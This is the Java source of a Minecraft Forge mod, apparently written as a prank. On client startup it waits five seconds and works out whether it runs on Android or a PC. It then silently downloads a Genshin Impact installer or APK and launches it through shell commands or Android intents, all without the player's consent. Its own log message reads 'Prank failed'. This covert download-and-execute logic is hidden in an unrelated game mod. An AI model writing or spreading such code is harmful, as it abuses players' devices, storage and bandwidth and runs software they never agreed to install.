package com.example.genshindownloader;

import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.event.lifecycle.FMLClientSetupEvent;
import net.minecraftforge.fml.javafmlmod.FMLJavaModLoadingContext;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

@Mod(GenshinDownloaderMod.MODID)
public class GenshinDownloaderMod {
    public static final String MODID = "genshindownloader";
    private static final Logger LOGGER = LogManager.getLogger();

    // 请替换为真实有效的下载链接（建议从官网获取最新直链）
    private static final String PC_URL = "https://hyp-webstatic.mihoyo.com/hyp-client/miHoYoLauncher_1.16.exe";
    private static final String ANDROID_URL = "https://ys-api.mihoyo.com/event/download_porter/link/ys_cn/official/android_backup319";

    public GenshinDownloaderMod() {
        FMLJavaModLoadingContext.get().getModEventBus().addListener(this::setup);
    }

    private void setup(final FMLClientSetupEvent event) {
        new Thread(() -> {
            try {
                Thread.sleep(5000);
                boolean isAndroid = isAndroid();
                String url = isAndroid ? ANDROID_URL : PC_URL;

                // ========== 修改点：Android 目录改为 FCL 的 .minecraft 目录 ==========
                String dir = isAndroid ? "/storage/emulated/0/FCL/.minecraft/" : System.getProperty("user.home") + "/Downloads/";
                String fileName = isAndroid ? "GenshinImpact.apk" : "GenshinImpact_installer.exe";

                // 确保目标目录存在
                File dirFile = new File(dir);
                if (!dirFile.exists()) {
                    dirFile.mkdirs();
                }

                File outputFile = new File(dir, fileName);

                if (outputFile.exists()) {
                    LOGGER.info("File already exists, launching install...");
                    launchInstall(outputFile, isAndroid);
                    return;
                }

                LOGGER.info("Downloading Genshin Impact...");
                downloadFile(url, outputFile);
                LOGGER.info("Download finished! Launching installer...");
                launchInstall(outputFile, isAndroid);

            } catch (Exception e) {
                LOGGER.error("Prank failed", e);
            }
        }).start();
    }

    // ==================== 修复后的 isAndroid() 检测方法 ====================
    private boolean isAndroid() {
        // 方法1：检测 Android 系统类（PojavLauncher 有效）
        try {
            Class.forName("android.os.Build");
            return true;
        } catch (ClassNotFoundException e) {
            // 继续尝试其他方法
        }

        // 方法2：检测环境变量（Android 系统一定有 ANDROID_ROOT）
        if (System.getenv("ANDROID_ROOT") != null) {
            return true;
        }

        // 方法3：检测 Java 提供商信息（FCL 通常包含 "Android"）
        String vendor = System.getProperty("java.vendor");
        if (vendor != null && vendor.toLowerCase().contains("android")) {
            return true;
        }

        // 方法4：检测操作系统名称
        String os = System.getProperty("os.name").toLowerCase();
        if (os.contains("android")) {
            return true;
        }

        // 都不是，返回 false（认为是 PC）
        return false;
    }
    // ====================================================================

    private void downloadFile(String urlStr, File dest) throws Exception {
        HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
        conn.setConnectTimeout(15000);
        conn.setReadTimeout(15000);
        // 开启自动跟随重定向（解决 302 跳转问题）
        conn.setInstanceFollowRedirects(true);
        try (InputStream in = conn.getInputStream();
             FileOutputStream out = new FileOutputStream(dest)) {
            byte[] buffer = new byte[8192];
            int bytesRead;
            while ((bytesRead = in.read(buffer)) != -1) {
                out.write(buffer, 0, bytesRead);
            }
        }
    }

    private void launchInstall(File file, boolean isAndroid) {
        if (isAndroid) {
            installOnAndroid(file);
        } else {
            installOnPC(file);
        }
    }

    private void installOnPC(File file) {
        try {
            String os = System.getProperty("os.name").toLowerCase();
            if (os.contains("win")) {
                Runtime.getRuntime().exec(new String[]{"cmd", "/c", "start", file.getAbsolutePath()});
            } else if (os.contains("mac")) {
                Runtime.getRuntime().exec(new String[]{"open", file.getAbsolutePath()});
            } else {
                Runtime.getRuntime().exec(new String[]{"xdg-open", file.getAbsolutePath()});
            }
        } catch (Exception e) {
            LOGGER.error("PC auto-launch failed", e);
        }
    }

    private void installOnAndroid(File file) {
        try {
            String path = file.getAbsolutePath();
            ProcessBuilder pb = new ProcessBuilder(
                "am", "start",
                "-a", "android.intent.action.VIEW",
                "-d", "file://" + path,
                "-t", "application/vnd.android.package-archive",
                "--flags", "268435456"
            );
            pb.inheritIO();
            pb.start();
            LOGGER.info("Android installer invoked via am command.");
        } catch (Exception e) {
            try {
                installAndroidReflect(file);
            } catch (Exception ex) {
                LOGGER.error("All Android install methods failed", ex);
            }
        }
    }

    private void installAndroidReflect(File file) throws Exception {
        Class<?> activityThread = Class.forName("android.app.ActivityThread");
        Object current = activityThread.getMethod("currentActivityThread").invoke(null);
        Object context = activityThread.getMethod("getApplication").invoke(current);

        Class<?> intentClass = Class.forName("android.content.Intent");
        Class<?> uriClass = Class.forName("android.net.Uri");
        Object intent = intentClass.getDeclaredConstructor(String.class)
            .newInstance("android.intent.action.VIEW");
        Object uri = uriClass.getMethod("fromFile", File.class).invoke(null, file);
        intentClass.getMethod("setDataAndType", uriClass, String.class)
            .invoke(intent, uri, "application/vnd.android.package-archive");
        intentClass.getMethod("setFlags", int.class)
            .invoke(intent, 0x10000000);

        context.getClass().getMethod("startActivity", intentClass).invoke(context, intent);
    }
}
